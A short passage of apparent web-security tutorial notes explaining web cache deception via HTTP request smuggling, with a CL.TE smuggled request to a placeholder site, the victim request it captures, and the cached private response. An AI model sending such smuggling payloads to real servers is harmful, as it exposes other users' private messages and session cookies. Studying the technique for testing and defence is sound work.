Is another variant of the Cache Poisoning. It works in a similar way to the web cache poisoning attack but has a different purpose.

- In Poisoning the attacker causes the app to store malicious content in the cache, and this is served from the cache to other app users.
- In Deception the attacker causes the app to store sensitive content belonging to another user in the cache, and the attacker retrieves this content.

So the attacker smuggles a request that returns sensitive user-specific content:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

So the next request from another user is forwarded to the backend will be appended to the smuggled one, including session cookies and other headers:

```http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

And then the backend processes the request for the user's private messages in the contenxt of the victim user's session. The frontend server caches this response against what it believes is the URL in the second request, which is /static/image.png:

```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```
